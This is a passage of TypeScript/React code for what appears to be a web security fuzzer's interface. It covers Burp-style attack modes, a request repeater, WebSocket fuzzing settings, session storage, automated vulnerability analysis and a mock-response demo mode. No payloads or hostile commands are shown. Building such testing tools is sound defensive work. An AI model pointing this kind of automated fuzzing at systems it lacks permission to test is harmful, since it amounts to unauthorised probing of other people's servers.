          body: payload.body || prev.body,
        }));
        setActiveTab(0);
      }
    } catch (err) {
      console.error("Failed to parse fuzzer handoff", err);
    } finally {
      localStorage.removeItem(FUZZER_HANDOFF_KEY);
    }
  }, []);
  
  const [results, setResults] = useState<FuzzResult[]>([]);
  const [isRunning, setIsRunning] = useState(false);
  const [isPaused, setIsPaused] = useState(false);
  const [progress, setProgress] = useState({ current: 0, total: 0 });
  const [stats, setStats] = useState({
    totalRequests: 0,
    successCount: 0,
    errorCount: 0,
    avgResponseTime: 0,
    startTime: null as Date | null,
  });
  
  // UI state
  const [selectedWordlist, setSelectedWordlist] = useState<WordlistConfig | null>(null);
  const [customPayloads, setCustomPayloads] = useState("");
  const [showWordlistDialog, setShowWordlistDialog] = useState(false);
  const [headerKey, setHeaderKey] = useState("");
  const [headerValue, setHeaderValue] = useState("");
  const [positionInput, setPositionInput] = useState("");
  const [resultFilter, setResultFilter] = useState({
    statusCode: "",
    minLength: "",
    maxLength: "",
    interestingOnly: false,
    // Enhanced filter options
    excludeStatusCodes: "",      // Negative match: exclude these status codes (comma-separated)
    regexPattern: "",            // Regex pattern to match in response body
    excludePattern: "",          // Pattern to exclude from results
    minResponseTime: "",         // Minimum response time in ms
    maxResponseTime: "",         // Maximum response time in ms
    contentType: "",             // Filter by content type
    showOnlyErrors: false,       // Show only error responses (4xx, 5xx)
    showOnlySuccess: false,      // Show only success responses (2xx)
    hideReflected: false,        // Hide results where payload is reflected
    showOnlyReflected: false,    // Show only results where payload is reflected
  });
  const [showAdvancedFilters, setShowAdvancedFilters] = useState(false);
  
  // AI & Guide state
  const [showGuide, setShowGuide] = useState(true); // Show by default for new users
  const [chatOpen, setChatOpen] = useState(false);
  const [chatMaximized, setChatMaximized] = useState(false);
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [chatLoading, setChatLoading] = useState(false);
  const [aiAnalysis, setAiAnalysis] = useState<AIAnalysis | null>(null);
  const [aiAnalyzing, setAiAnalyzing] = useState(false);
  const [activeStep, setActiveStep] = useState(0);
  
  // Interactive Beginner Wizard state
  const [wizardMode, setWizardMode] = useState(false);
  const [wizardStep, setWizardStep] = useState(0);
  const [showWizardHelp, setShowWizardHelp] = useState<string | null>(null);
  const [wizardValidation, setWizardValidation] = useState<Record<string, boolean>>({});
  const [showContextualHelp, setShowContextualHelp] = useState(true);
  
  // Save/Load config state
  const [savedConfigs, setSavedConfigs] = useState<SavedConfig[]>([]);
  const [saveConfigDialog, setSaveConfigDialog] = useState(false);
  const [loadConfigDialog, setLoadConfigDialog] = useState(false);
  const [configName, setConfigName] = useState("");
  const [configDescription, setConfigDescription] = useState("");
  
  // Response detail viewer state
  const [selectedResult, setSelectedResult] = useState<FuzzResult | null>(null);
  const [responseDialogOpen, setResponseDialogOpen] = useState(false);
  
  // Advanced features state
  const [advancedTab, setAdvancedTab] = useState(0);
  const [encodingInput, setEncodingInput] = useState("");
  const [selectedEncodings, setSelectedEncodings] = useState<string[]>(["url"]);
  const [encodedResults, setEncodedResults] = useState<Record<string, any>>({});
  const [generatorType, setGeneratorType] = useState("number_range");
  const [generatorParams, setGeneratorParams] = useState<Record<string, any>>({ start: 1, end: 100, step: 1 });
  const [generatedPayloads, setGeneratedPayloads] = useState<string[]>([]);
  const [mutationInput, setMutationInput] = useState("");
  const [selectedMutations, setSelectedMutations] = useState<string[]>(["case", "encoding"]);
  const [mutatedResults, setMutatedResults] = useState<Record<string, string[]>>({});
  const [analysisResults, setAnalysisResults] = useState<any>(null);
  const [analyzingResponses, setAnalyzingResponses] = useState(false);
  
  // Full AI Report state
  const [fullAiReport, setFullAiReport] = useState<any>(null);
  const [generatingFullReport, setGeneratingFullReport] = useState(false);
  const [showFullReportDialog, setShowFullReportDialog] = useState(false);
  const [showWrittenReportDialog, setShowWrittenReportDialog] = useState(false);
  
  // Scenario template state
  const [showScenarioDialog, setShowScenarioDialog] = useState(false);
  const [headerPresetAnchor, setHeaderPresetAnchor] = useState<null | HTMLElement>(null);
  
  // Session management state
  const [sessions, setSessions] = useState<any[]>([]);
  const [sessionsLoading, setSessionsLoading] = useState(false);
  const [selectedSession, setSelectedSession] = useState<any>(null);
  const [sessionDialogOpen, setSessionDialogOpen] = useState(false);
  const [saveSessionDialog, setSaveSessionDialog] = useState(false);
  const [sessionName, setSessionName] = useState("");
  const [sessionDescription, setSessionDescription] = useState("");
  const [sessionTags, setSessionTags] = useState<string[]>([]);
  const [newTag, setNewTag] = useState("");
  const [sessionsPage, setSessionsPage] = useState(1);
  const [sessionsTotal, setSessionsTotal] = useState(0);
  const [sessionSearch, setSessionSearch] = useState("");
  const [sessionStatusFilter, setSessionStatusFilter] = useState<string>("");
  
  // Smart detection state
  const [smartDetectionResults, setSmartDetectionResults] = useState<any>(null);
  const [runningSmartDetection, setRunningSmartDetection] = useState(false);
  const [vulnerabilityFindings, setVulnerabilityFindings] = useState<any[]>([]);
  const [anomalyResults, setAnomalyResults] = useState<any[]>([]);
  const [differentialResults, setDifferentialResults] = useState<any[]>([]);
  const [responseCategories, setResponseCategories] = useState<Record<string, string[]>>({});
  const [baselineIndex, setBaselineIndex] = useState(0);
  
  // Repeater state (like Burp Suite's Repeater)
  const [repeaterOpen, setRepeaterOpen] = useState(false);
  const [repeaterRequest, setRepeaterRequest] = useState<{
    url: string;
    method: string;
    headers: Record<string, string>;
    body: string;
    proxyUrl: string;
    originalPayload?: string;
  } | null>(null);
  const [repeaterResponse, setRepeaterResponse] = useState<{
    statusCode: number;
    headers: Record<string, string>;
    body: string;
    responseTime: number;
    contentLength: number;
  } | null>(null);
  const [repeaterSending, setRepeaterSending] = useState(false);
  const [repeaterHistory, setRepeaterHistory] = useState<Array<{
    id: string;
    request: typeof repeaterRequest;
    response: typeof repeaterResponse;
    timestamp: Date;
  }>>([]);
  
  // Response comparison state
  const [compareMode, setCompareMode] = useState(false);
  const [compareResults, setCompareResults] = useState<[FuzzResult | null, FuzzResult | null]>([null, null]);
  const [compareDialogOpen, setCompareDialogOpen] = useState(false);
  
  // ============================================================================
  // WEBSOCKET FUZZING STATE
  // ============================================================================
  const [wsConfig, setWsConfig] = useState({
    targetUrl: "",
    initialMessages: [] as string[],
    authToken: "",
    authHeader: "Authorization",
    origin: "",
    subprotocols: [] as string[],
    attackCategories: ["all"],
    customPayloads: [] as string[],
    messageTemplate: "",
    timeout: 10000,
    delayBetweenTests: 100,
    maxMessagesPerTest: 10,
  });
  const [wsResults, setWsResults] = useState<any[]>([]);
  const [wsIsRunning, setWsIsRunning] = useState(false);
  const [wsProgress, setWsProgress] = useState({ current: 0, total: 0 });
  const [wsStats, setWsStats] = useState<any>(null);
  const [wsFindings, setWsFindings] = useState<any[]>([]);
  const [wsCategories, setWsCategories] = useState<any[]>([]);
  const [wsNewInitMsg, setWsNewInitMsg] = useState("");
  const [wsNewCustomPayload, setWsNewCustomPayload] = useState("");
  const [wsSelectedCategory, setWsSelectedCategory] = useState<string | null>(null);
  const [wsCategoryPayloads, setWsCategoryPayloads] = useState<any>(null);
  
  // ============================================================================
  // COVERAGE TRACKING STATE
  // ============================================================================
  const [coverageSessions, setCoverageSessions] = useState<any[]>([]);
  const [activeCoverageSession, setActiveCoverageSession] = useState<any>(null);
  const [coverageLoading, setCoverageLoading] = useState(false);
  const [coverageGaps, setCoverageGaps] = useState<any>(null);
  const [coverageHeatmap, setCoverageHeatmap] = useState<any>(null);
  const [coverageTechniques, setCoverageTechniques] = useState<any[]>([]);
  const [owaspCategories, setOwaspCategories] = useState<any>({});
  const [coverageNewSessionUrl, setCoverageNewSessionUrl] = useState("");
  const [showCoverageReport, setShowCoverageReport] = useState(false);
  const [coverageReportContent, setCoverageReportContent] = useState("");
  
  const abortControllerRef = useRef<AbortController | null>(null);
  const chatEndRef = useRef<HTMLDivElement | null>(null);
  const navigate = useNavigate();

  // Scroll chat to bottom
  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [chatMessages]);
  
  // Load saved configurations from localStorage
  useEffect(() => {
    const saved = localStorage.getItem("vragent-fuzzing-configs");
    if (saved) {
      try {
        setSavedConfigs(JSON.parse(saved));
      } catch (e) {
        console.error("Failed to load saved configs:", e);
      }
    }
  }, []);
  
  // Save configurations to localStorage
  const persistConfigs = (configs: SavedConfig[]) => {
    localStorage.setItem("vragent-fuzzing-configs", JSON.stringify(configs));
    setSavedConfigs(configs);
  };
  
  // Save current configuration
  const saveConfiguration = () => {
    if (!configName.trim()) return;
    
    const newConfig: SavedConfig = {
      id: `config-${Date.now()}`,
      name: configName.trim(),
      description: configDescription.trim(),
      config: { ...config },
      savedAt: new Date().toISOString(),
    };
    
    persistConfigs([...savedConfigs, newConfig]);
    setConfigName("");
    setConfigDescription("");
    setSaveConfigDialog(false);
  };
  
  // Load a saved configuration
  const loadConfiguration = (saved: SavedConfig) => {
    setConfig(saved.config);
    setLoadConfigDialog(false);
  };
  
  // Delete a saved configuration
  const deleteConfiguration = (id: string) => {
    persistConfigs(savedConfigs.filter(c => c.id !== id));
  };
  
  // View response details
  const viewResponseDetails = (result: FuzzResult) => {
    setSelectedResult(result);
    setResponseDialogOpen(true);
  };
  
  // ==========================================================================
  // Repeater Functions (like Burp Suite's Repeater)
  // ==========================================================================
  
  // Send request to Repeater
  const sendToRepeater = (result: FuzzResult) => {
    // Build the URL with the payload substituted
    let targetUrl = config.targetUrl;
    if (targetUrl.includes("FUZZ") || targetUrl.includes("§0§")) {
      targetUrl = targetUrl.replace(/FUZZ|§0§/g, result.payload);
    }
    
    setRepeaterRequest({
      url: targetUrl,
      method: config.method,
      headers: { ...config.headers },
      body: config.body.replace(/FUZZ|§\d§/g, result.payload),
      proxyUrl: config.proxyUrl || "",
      originalPayload: result.payload,
    });
    setRepeaterResponse(null);
    setRepeaterOpen(true);
  };
  
  // Send Repeater request
  const sendRepeaterRequest = async () => {
    if (!repeaterRequest) return;
    
    setRepeaterSending(true);
    const startTime = Date.now();
    
    try {
      // Use the fuzzer API to send a single request
      const response = await fetch("/api/fuzzer/send-single", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${localStorage.getItem("token")}`,
        },
        body: JSON.stringify({
          url: repeaterRequest.url,
          method: repeaterRequest.method,
          headers: repeaterRequest.headers,
          body: repeaterRequest.body,
          proxy_url: repeaterRequest.proxyUrl || null,
        }),
      });
      
      const data = await response.json();
      const responseTime = Date.now() - startTime;
      
      const newResponse = {
        statusCode: data.status_code || data.statusCode || 0,
        headers: data.headers || {},
        body: data.body || "",
        responseTime: data.response_time || responseTime,
        contentLength: data.content_length || (data.body?.length || 0),
      };
      
      setRepeaterResponse(newResponse);
      
      // Add to history
      setRepeaterHistory(prev => [{
        id: `repeater-${Date.now()}`,
        request: { ...repeaterRequest },
        response: newResponse,
        timestamp: new Date(),
      }, ...prev].slice(0, 50)); // Keep last 50
      
    } catch (e: any) {
      setRepeaterResponse({
        statusCode: 0,
        headers: {},
        body: `Error: ${e.message || "Failed to send request"}`,
        responseTime: Date.now() - startTime,
        contentLength: 0,
      });
    } finally {
      setRepeaterSending(false);
    }
  };
  
  // Add header to Repeater request
  const addRepeaterHeader = () => {
    if (repeaterRequest) {
      setRepeaterRequest({
        ...repeaterRequest,
        headers: { ...repeaterRequest.headers, "": "" },
      });
    }
  };
  
  // Update Repeater header
  const updateRepeaterHeader = (oldKey: string, newKey: string, value: string) => {
    if (repeaterRequest) {
      const newHeaders = { ...repeaterRequest.headers };
      if (oldKey !== newKey) {
        delete newHeaders[oldKey];
      }
      newHeaders[newKey] = value;
      setRepeaterRequest({ ...repeaterRequest, headers: newHeaders });
    }
  };
  
  // Delete Repeater header
  const deleteRepeaterHeader = (key: string) => {
    if (repeaterRequest) {
      const newHeaders = { ...repeaterRequest.headers };
      delete newHeaders[key];
      setRepeaterRequest({ ...repeaterRequest, headers: newHeaders });
    }
  };
  
  // ==========================================================================
  // Response Comparison Functions
  // ==========================================================================
  
  // Toggle compare mode
  const toggleCompareResult = (result: FuzzResult) => {
    setCompareResults(prev => {
      if (prev[0]?.id === result.id) {
        return [null, prev[1]];
      }
      if (prev[1]?.id === result.id) {
        return [prev[0], null];
      }
      if (!prev[0]) {
        return [result, prev[1]];
      }
      if (!prev[1]) {
        return [prev[0], result];
      }
      // Replace first selection
      return [result, prev[1]];
    });
  };
  
  // Open comparison dialog
  const openCompareDialog = () => {
    if (compareResults[0] && compareResults[1]) {
      setCompareDialogOpen(true);
    }
  };

  // ==========================================================================
  // Session Management Functions
  // ==========================================================================
  
  // Load sessions from backend
  const loadSessions = useCallback(async () => {
    setSessionsLoading(true);
    try {
      const result = await fuzzer.listSessions({
        page: sessionsPage,
        page_size: 10,
        status: sessionStatusFilter || undefined,
        search: sessionSearch || undefined,
      });
      setSessions(result.sessions);
      setSessionsTotal(result.total);
    } catch (e: any) {
      console.error("Failed to load sessions:", e);
    } finally {
      setSessionsLoading(false);
    }
  }, [sessionsPage, sessionStatusFilter, sessionSearch]);
  
  // Load sessions on mount and when filters change
  useEffect(() => {
    loadSessions();
  }, [loadSessions]);
  
  // Save current results as a session
  const saveAsSession = async () => {
    if (!sessionName.trim()) return;
    
    try {
      // Create session
      const session = await fuzzer.createSession({
        name: sessionName.trim(),
        description: sessionDescription.trim() || undefined,
        target_url: config.targetUrl,
        method: config.method,
        config: config as any,
        tags: sessionTags,
      });
      
      // Update with results if we have them
      if (results.length > 0) {
        const apiResults = results.map(r => ({
          id: r.id,
          payload: r.payload,
          status_code: r.statusCode,
          response_length: r.responseLength,
          response_time: r.responseTime,
          content_type: r.contentType,
          headers: r.headers,
          body: r.body || "",
          timestamp: r.timestamp?.toISOString() || new Date().toISOString(),
          interesting: r.interesting,
          flags: r.flags,
        }));
        
        await fuzzer.updateSession(session.id, {
          status: "completed",
          results: apiResults,
          total_requests: results.length,
          success_count: results.filter(r => r.statusCode >= 200 && r.statusCode < 300).length,
          error_count: results.filter(r => r.error).length,
          interesting_count: results.filter(r => r.interesting).length,
          avg_response_time: results.reduce((sum, r) => sum + r.responseTime, 0) / results.length,
        });
      }
      
      setSessionName("");
      setSessionDescription("");
      setSessionTags([]);
      setSaveSessionDialog(false);
      loadSessions();
    } catch (e: any) {
      console.error("Failed to save session:", e);
    }
  };
  
  // Load a session
  const loadSession = async (sessionId: number) => {
    try {
      const session = await fuzzer.getSession(sessionId);
      setSelectedSession(session);
      
      // Load config
      if (session.config) {
        setConfig(session.config as FuzzConfig);
      }
      
      // Load results
      if (session.results && session.results.length > 0) {
        const loadedResults: FuzzResult[] = session.results.map((r: any) => ({
          id: r.id,
          payload: r.payload,
          statusCode: r.status_code,
          responseLength: r.response_length,
          responseTime: r.response_time,
          contentType: r.content_type,
          headers: r.headers || {},
          body: r.body,
          timestamp: new Date(r.timestamp),
          interesting: r.interesting,
          flags: r.flags || [],
        }));
        setResults(loadedResults);
      }
      
      // Load analysis if available
      if (session.analysis) {
        setSmartDetectionResults(session.analysis);
        if (session.analysis.vulnerabilities) {
          setVulnerabilityFindings(session.analysis.vulnerabilities.findings || []);
        }
        if (session.analysis.anomalies) {
          setAnomalyResults(session.analysis.anomalies.items || []);
        }
        if (session.analysis.categories) {
          setResponseCategories(session.analysis.categories.groups || {});
        }
      }
      
      setSessionDialogOpen(false);
    } catch (e: any) {
      console.error("Failed to load session:", e);
    }
  };
  
  // Delete a session
  const deleteSession = async (sessionId: number) => {
    try {
      await fuzzer.deleteSession(sessionId);
      loadSessions();
    } catch (e: any) {
      console.error("Failed to delete session:", e);
    }
  };
  
  // Duplicate a session
  const duplicateSession = async (sessionId: number) => {
    try {
      await fuzzer.duplicateSession(sessionId);
      loadSessions();
    } catch (e: any) {
      console.error("Failed to duplicate session:", e);
    }
  };
  
  // ==========================================================================
  // Smart Detection Functions
  // ==========================================================================
  
  // Run comprehensive smart detection
  const runSmartDetection = async () => {
    if (results.length === 0) return;
    
    setRunningSmartDetection(true);
    try {
      const apiResponses = results.map(r => ({
        id: r.id,
        payload: r.payload,
        status_code: r.statusCode,
        response_length: r.responseLength,
        response_time: r.responseTime,
        content_type: r.contentType,
        headers: r.headers,
        body: r.body || "",
        timestamp: r.timestamp?.toISOString() || new Date().toISOString(),
        interesting: r.interesting,
        flags: r.flags,
      }));
      
      const analysis = await fuzzer.autoAnalyze(apiResponses, {
        detect_vulnerabilities: true,
        detect_anomalies: true,
        categorize: true,
        differential: baselineIndex >= 0,
        baseline_index: baselineIndex,
      });
      
      setSmartDetectionResults(analysis);
      
      if (analysis.vulnerabilities) {
        setVulnerabilityFindings(analysis.vulnerabilities.findings);
      }
      if (analysis.anomalies) {
        setAnomalyResults(analysis.anomalies.items);
      }
      if (analysis.categories) {
        setResponseCategories(analysis.categories.groups);
      }
      if (analysis.differential) {
        setDifferentialResults(analysis.differential.results);
      }
    } catch (e: any) {
      console.error("Smart detection failed:", e);
    } finally {
      setRunningSmartDetection(false);
    }
  };
  
  // Run vulnerability detection only
  const runVulnerabilityDetection = async () => {
    if (results.length === 0) return;
    
    try {
      const apiResponses = results.map(r => ({
        id: r.id,
        payload: r.payload,
        status_code: r.statusCode,
        response_length: r.responseLength,
        response_time: r.responseTime,
        content_type: r.contentType,
        headers: r.headers,
        body: r.body || "",
        timestamp: r.timestamp?.toISOString() || new Date().toISOString(),
        interesting: r.interesting,
        flags: r.flags,
      }));
      
      const result = await fuzzer.detectVulnerabilities(apiResponses);
      setVulnerabilityFindings(result.findings);
    } catch (e: any) {
      console.error("Vulnerability detection failed:", e);
    }
  };
  
  // Run anomaly detection only
  const runAnomalyDetection = async () => {
    if (results.length === 0) return;
    
    try {
      const apiResponses = results.map(r => ({
        id: r.id,
        payload: r.payload,
        status_code: r.statusCode,
        response_length: r.responseLength,
        response_time: r.responseTime,
        content_type: r.contentType,
        headers: r.headers,
        body: r.body || "",
        timestamp: r.timestamp?.toISOString() || new Date().toISOString(),
        interesting: r.interesting,
        flags: r.flags,
      }));
      
      const result = await fuzzer.detectAnomalies(apiResponses);
      setAnomalyResults(result.anomalies);
    } catch (e: any) {
      console.error("Anomaly detection failed:", e);
    }
  };

  // Calculate request count based on attack mode
  const calculateTotalRequests = useCallback(() => {
    const positions = config.positions.length;
    const payloadCounts = config.payloads.map(p => p.length);
    
    if (positions === 0 || payloadCounts.every(c => c === 0)) return 0;
    
    switch (config.attackMode) {
      case "sniper":
        return payloadCounts.reduce((sum, count) => sum + count, 0);
      case "batteringram":
        return Math.max(...payloadCounts);
      case "pitchfork":
        return Math.min(...payloadCounts.filter(c => c > 0));
      case "clusterbomb":
        return payloadCounts.reduce((product, count) => product * (count || 1), 1);
      default:
        return 0;
    }
  }, [config.positions, config.payloads, config.attackMode]);

  // Add position marker to URL/body
  const addPosition = () => {
    const marker = `§${config.positions.length}§`;
    const newPositions = [...config.positions, positionInput || marker];
    setConfig(prev => ({
      ...prev,
      positions: newPositions,
      payloads: [...prev.payloads, []],
    }));
    setPositionInput("");
  };

  // Remove position
  const removePosition = (index: number) => {
    setConfig(prev => ({
      ...prev,
      positions: prev.positions.filter((_, i) => i !== index),
      payloads: prev.payloads.filter((_, i) => i !== index),
    }));
  };

  // Add header
  const addHeader = () => {
    if (headerKey && headerValue) {
      setConfig(prev => ({
        ...prev,
        headers: { ...prev.headers, [headerKey]: headerValue },
      }));
      setHeaderKey("");
      setHeaderValue("");
    }
  };

  // Add header from preset
  const addHeaderPreset = (preset: typeof HEADER_PRESETS[0]) => {
    setConfig(prev => ({
      ...prev,
      headers: { ...prev.headers, [preset.header]: preset.value },
    }));
    setHeaderPresetAnchor(null);
  };

  // Apply scenario template
  const applyScenario = (scenarioKey: keyof typeof SCENARIO_TEMPLATES) => {
    const scenario = SCENARIO_TEMPLATES[scenarioKey];
    const configWithBody = scenario.config as { method: string; targetUrl: string; headers?: Record<string, string>; body?: string };
    setConfig(prev => ({
      ...prev,
      method: configWithBody.method,
      targetUrl: configWithBody.targetUrl,
      headers: configWithBody.headers || prev.headers,
      body: configWithBody.body || "",
      positions: ["FUZZ"],
      payloads: [scenario.payloads],
    }));
    setShowScenarioDialog(false);
  };

  // Generate full AI security report
  const generateFullAiReport = async () => {
    if (results.length === 0) return;
    
    setGeneratingFullReport(true);
    try {
      // Convert results to API format
      const apiResponses = results.map(r => ({
        id: r.id,
        payload: r.payload,
        status_code: r.statusCode,
        response_length: r.responseLength,
        response_time: r.responseTime,
        content_type: r.contentType,
        headers: r.headers,
        body: r.body || "",
        timestamp: r.timestamp?.toISOString() || new Date().toISOString(),
        interesting: r.interesting,
        flags: r.flags,
      }));
      
      // Call the comprehensive auto-analyze endpoint
      const report = await fuzzer.autoAnalyze(apiResponses, {
        detect_vulnerabilities: true,
        detect_anomalies: true,
        categorize: true,
        differential: true,
        baseline_index: 0,
      });
      
      setFullAiReport(report);
      setShowFullReportDialog(true);
      
      // Also update the basic AI analysis for the header display
      if (report.vulnerabilities && report.vulnerabilities.findings.length > 0) {
        setAiAnalysis({
          summary: `Comprehensive analysis complete. Found ${report.vulnerabilities.total} potential vulnerabilities with a risk score of ${report.summary.risk_score}/100.`,
          riskLevel: report.summary.risk_level as "critical" | "high" | "medium" | "low" | "info",
          findings: report.vulnerabilities.findings.map((f: any) => ({
            type: f.vuln_type || f.type || "Unknown",
            severity: f.severity || "medium",
            description: f.description || f.title || "",
            evidence: f.evidence || f.indicators || [],
            recommendation: f.recommendation || "",
          })),
          patterns: report.anomalies?.items?.map((a: any) => `${a.anomaly_type}: ${a.description}`) || [],
          recommendations: report.vulnerabilities.findings
            .map((f: any) => f.recommendation)
            .filter((r: string, i: number, arr: string[]) => r && arr.indexOf(r) === i)
            .slice(0, 5) || [],
        });
      }
    } catch (e: any) {
      console.error("Failed to generate AI report:", e);
    } finally {
      setGeneratingFullReport(false);
    }
  };

  // Remove header
  const removeHeader = (key: string) => {
    setConfig(prev => {
      const newHeaders = { ...prev.headers };
      delete newHeaders[key];
      return { ...prev, headers: newHeaders };
    });
  };

  // Load wordlist into position
  const loadWordlist = (wordlist: WordlistConfig, positionIndex: number) => {
    setConfig(prev => {
      const newPayloads = [...prev.payloads];
      newPayloads[positionIndex] = wordlist.sample;
      return { ...prev, payloads: newPayloads };
    });
    setShowWordlistDialog(false);
  };

  // Load custom payloads
  const loadCustomPayloads = (positionIndex: number) => {
    const payloads = customPayloads.split("\n").filter(p => p.trim());
    setConfig(prev => {
      const newPayloads = [...prev.payloads];
      newPayloads[positionIndex] = payloads;
      return { ...prev, payloads: newPayloads };
    });
    setCustomPayloads("");
  };

  // State for backend connection mode
  const [useBackend, setUseBackend] = useState(true);
  const streamRef = useRef<any>(null);

  // Start fuzzing - uses real backend with streaming
  const startFuzzing = async () => {
    if (!config.targetUrl) return;
    
    setIsRunning(true);
    setIsPaused(false);
    setResults([]);
    setAiAnalysis(null);
    const totalRequests = calculateTotalRequests();
    setProgress({ current: 0, total: totalRequests });
    setStats({
      totalRequests: 0,
      successCount: 0,
      errorCount: 0,
      avgResponseTime: 0,
      startTime: new Date(),
    });
    
    abortControllerRef.current = new AbortController();
    
    if (useBackend) {
      // Use real backend API with streaming
      try {
        const apiConfig: APIFuzzerConfig = {
          target_url: config.targetUrl,
          method: config.method,
          headers: config.headers,
          body: config.body,
          positions: config.positions,
          payloads: config.payloads,
          attack_mode: config.attackMode as "sniper" | "batteringram" | "pitchfork" | "clusterbomb",
          threads: config.threads,
          delay: config.delay,
          timeout: config.timeout,
          follow_redirects: config.followRedirects,
          match_codes: config.matchCodes,
          filter_codes: config.filterCodes,
          match_regex: config.matchRegex,
          proxy_url: config.proxyUrl || undefined,
        };
        
        streamRef.current = fuzzer.stream(
          apiConfig,
          (event) => {
            if (event.type === "start") {
              setProgress({ current: 0, total: event.total });
            } else if (event.type === "progress") {
              const response = event.response as FuzzerResponse;
              const result: FuzzResult = {
                id: response.id,
                payload: response.payload,
                statusCode: response.status_code,
                responseLength: response.response_length,
                responseTime: response.response_time,
                contentType: response.content_type,
                headers: response.headers,
                body: response.body,
                timestamp: new Date(response.timestamp),
                error: response.error,
                interesting: response.interesting,
                flags: response.flags,
              };
              
              setResults(prev => [...prev, result]);
              setProgress({ current: event.current, total: event.total });
              setStats(prev => ({
                ...prev,
                totalRequests: prev.totalRequests + 1,
                successCount: result.statusCode >= 200 && result.statusCode < 400 
                  ? prev.successCount + 1 
                  : prev.successCount,
                errorCount: result.statusCode >= 400 || result.error 
                  ? prev.errorCount + 1 
                  : prev.errorCount,
                avgResponseTime: (prev.avgResponseTime * prev.totalRequests + result.responseTime) / (prev.totalRequests + 1),
              }));
            } else if (event.type === "complete") {
              setIsRunning(false);
              // Auto-run AI analysis on completion if we have findings
              if (event.findings && event.findings.length > 0) {
                // Convert backend findings to our format
                setAiAnalysis({
                  summary: `Fuzzing completed. Found ${event.findings.length} potential security issues.`,
                  riskLevel: event.findings.some((f: any) => f.severity === "critical") ? "critical"
                    : event.findings.some((f: any) => f.severity === "high") ? "high"
                    : event.findings.some((f: any) => f.severity === "medium") ? "medium"
                    : "low",
                  findings: event.findings.map((f: any) => ({
                    type: f.type,
                    severity: f.severity,
                    description: f.description,
                    evidence: f.evidence,
                    recommendation: f.recommendation,
                  })),
                  patterns: [],
                  recommendations: event.findings.map((f: any) => f.recommendation).filter((r: string, i: number, arr: string[]) => arr.indexOf(r) === i),
                });
              }
            } else if (event.type === "error") {
              console.error("Fuzzing error:", event.message);
              setIsRunning(false);
            }
          },
          (err) => {
            console.error("Stream error:", err);
            setIsRunning(false);
          }
        );
      } catch (err: any) {
        console.error("Failed to start fuzzing:", err);
        setIsRunning(false);
      }
    } else {
      // Fallback to mock mode for demo/testing
      await runMockFuzzing();
    }
  };
  
  // Mock fuzzing for demo purposes (when backend is unavailable)
  const runMockFuzzing = async () => {
    const allPayloads = generatePayloadCombinations();
    
    for (let i = 0; i < allPayloads.length; i++) {
      if (abortControllerRef.current?.signal.aborted) break;
      
      while (isPaused) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
      const payload = allPayloads[i];
      
      await new Promise(resolve => setTimeout(resolve, config.delay + Math.random() * 50));
      
      const mockBodies = [
        `<!DOCTYPE html><html><head><title>Response</title></head><body><h1>Success</h1><p>Request processed successfully.</p></body></html>`,
        `{"status": "ok", "message": "Request completed", "data": {"id": ${i}, "timestamp": "${new Date().toISOString()}"}}`,
        `<!DOCTYPE html><html><head><title>Error</title></head><body><h1>403 Forbidden</h1><p>You don't have permission to access this resource.</p></body></html>`,
        `<!DOCTYPE html><html><head><title>Not Found</title></head><body><h1>404 Not Found</h1><p>The requested resource was not found.</p></body></html>`,
        `<!DOCTYPE html><html><head><title>Error</title></head><body><h1>500 Internal Server Error</h1><p>An error occurred: ${payload.join(", ").substring(0, 50)}</p><pre>Stack trace:\n  at processRequest()\n  at handlePayload()\n  at main()</pre></body></html>`,
        `{"error": true, "code": "INVALID_INPUT", "message": "Invalid characters detected in input: ${payload.join(", ").substring(0, 30)}..."}`,
      ];
      const statusCodes = [200, 301, 302, 403, 404, 500];
      const statusIndex = Math.floor(Math.random() * statusCodes.length);
      const mockBody = mockBodies[statusIndex];
      
      const mockResult: FuzzResult = {
        id: `${Date.now()}-${i}`,
        payload: payload.join(", "),
        statusCode: statusCodes[statusIndex],
        responseLength: mockBody.length,
        responseTime: Math.floor(Math.random() * 500) + 50,
        contentType: mockBody.startsWith("{") ? "application/json" : "text/html",
        headers: {
          "Content-Type": mockBody.startsWith("{") ? "application/json" : "text/html",
          "Server": "nginx/1.18.0",
          "Date": new Date().toUTCString(),
          "X-Request-ID": `req-${Date.now()}-${i}`,
          "Cache-Control": "no-cache, no-store, must-revalidate",
        },
        body: mockBody,
        timestamp: new Date(),
        interesting: Math.random() > 0.9,
        flags: Math.random() > 0.95 ? ["Potential SQLi", "Error Message"] : [],
      };
      
      setResults(prev => [...prev, mockResult]);
      setProgress(prev => ({ ...prev, current: i + 1 }));
      setStats(prev => ({
        ...prev,
        totalRequests: prev.totalRequests + 1,
        successCount: mockResult.statusCode < 400 ? prev.successCount + 1 : prev.successCount,
        errorCount: mockResult.statusCode >= 400 ? prev.errorCount + 1 : prev.errorCount,
        avgResponseTime: (prev.avgResponseTime * prev.totalRequests + mockResult.responseTime) / (prev.totalRequests + 1),
      }));
    }
    
    setIsRunning(false);
  };

  // Generate payload combinations based on attack mode
  const generatePayloadCombinations = (): string[][] => {
    const combinations: string[][] = [];
    const payloadSets = config.payloads.filter(p => p.length > 0);
    
    if (payloadSets.length === 0) return [];
    
    switch (config.attackMode) {
      case "sniper":
        payloadSets.forEach((set, setIndex) => {
          set.forEach(payload => {
            const combo = config.payloads.map((_, i) => i === setIndex ? payload : "");
            combinations.push(combo);
          });
        });
        break;
        
      case "batteringram":
        const maxLength = Math.max(...payloadSets.map(s => s.length));
        for (let i = 0; i < maxLength; i++) {
          const payload = payloadSets[0]?.[i] || payloadSets[0]?.[0] || "";
          combinations.push(Array(config.positions.length).fill(payload));
        }
        break;
        
      case "pitchfork":
        const minLength = Math.min(...payloadSets.map(s => s.length));
        for (let i = 0; i < minLength; i++) {
          combinations.push(payloadSets.map(set => set[i]));
        }
        break;
        
      case "clusterbomb":
        const generateCombos = (arrays: string[][], index: number, current: string[]): void => {
          if (index === arrays.length) {
            combinations.push([...current]);
            return;
          }
          for (const item of arrays[index]) {
            current.push(item);
            generateCombos(arrays, index + 1, current);
            current.pop();
          }
        };
        generateCombos(payloadSets, 0, []);
        break;
    }
    
    return combinations;
  };

  // Stop fuzzing
  const stopFuzzing = () => {
    abortControllerRef.current?.abort();
    if (streamRef.current?.close) {
      streamRef.current.close();
    }
    setIsRunning(false);
    setIsPaused(false);
  };

